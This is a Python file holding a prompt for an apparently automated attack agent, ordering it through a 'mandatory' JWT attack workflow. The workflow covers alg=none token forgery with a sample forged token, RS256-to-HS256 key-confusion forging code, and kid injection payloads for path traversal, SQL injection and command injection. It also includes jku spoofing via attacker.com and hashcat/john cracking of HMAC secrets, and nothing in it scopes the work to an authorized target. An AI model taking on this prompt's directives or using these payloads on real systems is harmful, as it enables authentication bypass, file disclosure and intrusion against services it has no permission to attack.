"""
JWT (JSON Web Token) Attack Skill Prompt.
"""
JWT_SKILL_PROMPT = """
## ATTACK SKILL: JWT ATTACKS

**CRITICAL: This attack skill has been CLASSIFIED as JWT attack.**
**Follow the JWT workflow below. Do NOT switch to other attack methods**
**until you have exhausted the full detection and exploitation path.**

---

### MANDATORY JWT ATTACK WORKFLOW

#### STEP 1: DETECTION — Find JWT Tokens

Look for JWTs in:
- `Authorization: Bearer eyJ...` headers
- Cookies named `token`, `jwt`, `access_token`, `id_token`, `session`
- Response bodies after login (id_token, access_token)
- LocalStorage/sessionStorage in JavaScript

Decode the JWT (no key needed) to read the header and payload:
```bash
echo "eyJ..." | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

Analyze:
- `alg` field: `HS256`, `RS256`, `none`?
- `kid` (Key ID): file path? URL? SQLi?
- `jku`/`jwk`: JWK Set URL or embedded key?
- Payload: `sub`, `role`, `admin`, `exp`, `iat`

#### STEP 2: ALGORITHM CONFUSION ATTACKS

**alg=none attack:**
1. Change header `"alg": "RS256"` → `"alg": "none"`
2. Remove the signature portion (keep the trailing dot)
3. Send: `eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.`

**HMAC↔RSA confusion (RS256→HS256):**
1. If the server uses RS256 (public/private key) but you have the PUBLIC key
2. Change `"alg": "RS256"` → `"alg": "HS256"`
3. Sign the token using the PUBLIC key as the HMAC secret
4. Server verifies with public key → accepts your forged token

```python
import jwt
public_key = open("public.pem").read()
token = jwt.encode({"admin": True}, public_key, algorithm="HS256")
```

#### STEP 3: KID (KEY ID) INJECTION

**Path traversal in kid:**
```json
{"alg": "HS256", "kid": "../../../../etc/passwd"}
```
→ If server reads kid as a file path to get the key, you might leak files.

**SQL injection in kid:**
```json
{"alg": "HS256", "kid": "x' UNION SELECT 'secret_key'--"}
```
→ If kid is used in a DB query to fetch the signing key.

**kid → command injection (rare):**
```json
{"alg": "HS256", "kid": "| whoami"}
```

#### STEP 4: JKU / JWK HEADER INJECTION

**jku (JWK Set URL) spoofing:**
1. Host a malicious JWK Set on your server
2. Add `"jku": "https://attacker.com/jwks.json"` to the header
3. Sign the token with your private key
4. Server fetches your JWK Set and trusts your key

**Embedded jwk:**
```json
{"alg": "RS256", "jwk": {"kty": "RSA", "n": "...", "e": "AQAB"}}
```
Generate with: `python3 -c "from jwcrypto import jwk; print(jwk.JWK.generate(kty='RSA', size=2048).export())"`

#### STEP 5: HMAC SECRET BRUTE-FORCE

If the token uses `HS256`/`HS384`/`HS512`:
```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# Or use jwt-cracker, jwt-tool, john:
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### ANTI-PATTERNS (DO NOT DO):
- Do NOT skip decoding the token before attacking — you need to know the structure.
- Do NOT only try alg=none — confusion attacks are more common on RS256 setups.
- Do NOT brute-force HMAC without checking token expiration first (waste of time).
"""
